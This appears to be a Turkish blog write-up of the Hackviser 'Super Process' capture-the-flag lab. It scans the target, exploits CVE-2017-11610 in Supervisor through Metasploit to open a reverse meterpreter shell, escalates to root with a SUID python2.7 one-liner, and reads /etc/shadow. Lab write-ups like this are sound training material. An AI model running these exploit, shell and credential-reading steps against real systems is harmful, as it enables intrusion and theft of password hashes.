---
title: Super Process
date: 2024-03-27 12:23:12 
categories: [Hackviser]
tags: [Warmups]  
image: /images/superprocess.webp
---

Bu makine, yaygın olarak kullanılan bir açık kaynaklı web uygulamasında zafiyet araştırmacılığının, makineye erişim sağlamanın ve linux tabanlı sistemlerde yetki yükseltme saldırılarının nasıl yapılabileceğini öğretmeye odaklanır.

Bir web uygulamasında zafiyet tespit edilmesi, zafiyetin Metasploit Framework aracılığıyla istismar edilmesi ve hatalı yapılandırmalardan kaynaklı yetki yükseltme saldırıları ile ilgili alıştırmalar yapmak için önerilir.

<a href="https://app.hackviser.com/warmups/super-process">Super Process</a>

---

1- Hangi portlar açık?


````bash
┌──(root㉿kali)-[~]
└─# nmap -T4 -sV 172.20.1.131
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-30 13:24 EDT
Nmap scan report for 172.20.1.131 (172.20.1.131)
Host is up (0.070s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
9001/tcp open  http    Medusa httpd 1.12 (Supervisor process manager)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.29 seconds
````

2- Web uygulamasında bulunan güvenlik açığının CVE kodu nedir?

9001 portunda bir web servisi çalıştığını görüyoruz.


![](https://github.com/umutsaglam/CTF-Writeups/blob/main/Hackviser/SuperProcess/images/1.png?raw=true)


Websitesinin altında yazan Supervisor 3.3.2 versiyonunu araştırdım.

````bash
┌──(root㉿kali)-[~]
└─# searchsploit supervisor 3.3.2
----------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                         |  Path
----------------------------------------------------------------------------------------------------------------------- ---------------------------------
Supervisor 3.0a1 < 3.3.2 - XML-RPC (Authenticated) Remote Code Execution (Metasploit)                                  | linux/remote/42779.rb
----------------------------------------------------------------------------------------------------------------------- ---------------------------------
````

Metasploitte bununla ilgili bir exploit mevcut. Bu exploiti kullarak ilerleyeceğim.

````
msf6 > search supervisor

Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  exploit/linux/http/cisco_ucs_rce             2019-08-21       excellent  Yes    Cisco UCS Director Unauthenticated Remote Code Execution
   1  exploit/linux/ssh/cisco_ucs_scpuser          2019-08-21       excellent  No     Cisco UCS Director default scpuser password
   2  exploit/linux/http/supervisor_xmlrpc_exec    2017-07-19       excellent  Yes    Supervisor XML-RPC Authenticated Remote Code Execution
   3  exploit/linux/http/trueonline_p660hn_v2_rce  2016-12-26       excellent  Yes    TrueOnline / ZyXEL P660HN-T v2 Router Authenticated Command Injection
   4  exploit/linux/http/zyxel_lfi_unauth_ssh_rce  2022-02-01       excellent  Yes    Zyxel chained RCE using LFI and weak password derivation algorithm
   5    \_ target: Unix Command                    .                .          .      .
   6    \_ target: Linux Dropper                   .                .          .      .
   7    \_ target: Interactive SSH                 .                .          .      .


Interact with a module by name or index. For example info 7, use 7 or use exploit/linux/http/zyxel_lfi_unauth_ssh_rce
After interacting with a module you can manually set a TARGET with set TARGET 'Interactive SSH'

msf6 > use 2
[*] Using configured payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(linux/http/supervisor_xmlrpc_exec) > info

       Name: Supervisor XML-RPC Authenticated Remote Code Execution
     Module: exploit/linux/http/supervisor_xmlrpc_exec
   Platform: Linux
       Arch: x86, x64
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2017-07-19

Provided by:
  Calum Hutton <c.e.hutton@gmx.com>

Available targets:
      Id  Name
      --  ----
  =>  0   3.0a1-3.3.2

Check supported:
  Yes

Basic options:
  Name          Current Setting  Required  Description
  ----          ---------------  --------  -----------
  HttpPassword                   no        Password for HTTP basic auth
  HttpUsername                   no        Username for HTTP basic auth
  Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS                         yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
  RPORT         9001             yes       The target port (TCP)
  SSL           false            no        Negotiate SSL/TLS for outgoing connections
  SSLCert                        no        Path to a custom SSL certificate (default is randomly generated)
  TARGETURI     /RPC2            yes       The path to the XML-RPC endpoint
  URIPATH                        no        The URI to use for this exploit (default is random)
  VHOST                          no        HTTP server virtual host


  When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to list
                                      en on all addresses.
  SRVPORT  8080             yes       The local port to listen on.

Payload information:

Description:
  This module exploits a vulnerability in the Supervisor process control software, where an authenticated client
  can send a malicious XML-RPC request to supervisord that will run arbitrary shell commands on the server.
  The commands will be run as the same user as supervisord. Depending on how supervisord has been configured, this
  may be root. This vulnerability can only be exploited by an authenticated client, or if supervisord has been
  configured to run an HTTP server without authentication. This vulnerability affects versions 3.0a1 to 3.3.2.

References:
  https://github.com/Supervisor/supervisor/issues/964
  https://www.debian.org/security/2017/dsa-3942
  https://github.com/phith0n/vulhub/tree/master/supervisor/CVE-2017-11610
  https://nvd.nist.gov/vuln/detail/CVE-2017-11610
````

- CVE-2017-11610

Exploiti çalıştıralım.

````
msf6 exploit(linux/http/supervisor_xmlrpc_exec) > set lhost 10.8.1.33
lhost => 10.8.1.33
msf6 exploit(linux/http/supervisor_xmlrpc_exec) > set rhosts 172.20.1.131
rhosts => 172.20.1.131
msf6 exploit(linux/http/supervisor_xmlrpc_exec) > run

[*] Started reverse TCP handler on 10.8.1.33:4444 
[*] Sending XML-RPC payload via POST to 172.20.1.131:9001/RPC2
[*] Sending stage (3045380 bytes) to 172.20.1.131
[*] Command Stager progress -  97.32% done (798/820 bytes)
[*] Sending XML-RPC payload via POST to 172.20.1.131:9001/RPC2
[*] Command Stager progress - 100.00% done (820/820 bytes)
[+] Request returned without status code, usually indicates success. Passing to handler..
[*] Meterpreter session 1 opened (10.8.1.33:4444 -> 172.20.1.131:39564) at 2024-03-30 13:32:49 -0400

meterpreter >
````

Makineye giriş yapmayı başardık.

3- Güvenlik zafiyeti bulunan servis hangi kullanıcının izinleri ve yetkileri ile çalışıyor?

````bash
meterpreter > shell
Process 471 created.
Channel 1 created.
id
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
````

4- Yetki yükseltme için kullanabileceğimiz SUID izinlerine sahip uygulamanın adı nedir?

`find / -perm -u=s -type f 2>/dev/null` komutunu kullanabiliriz.

````bash
find / -perm -u=s -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/chfn
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/python2.7
````

Yetki yükseltmek için `/usr/bin/python2.7` dosyasını kullanabiliriz.

````bash
python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
whoami
root
````

5- "root" kullanıcısı için /etc/shadow içindeki parola hash değeri nedir?

````bash
cat /etc/shadow
````


![fsoc](/images/fsoc.gif)


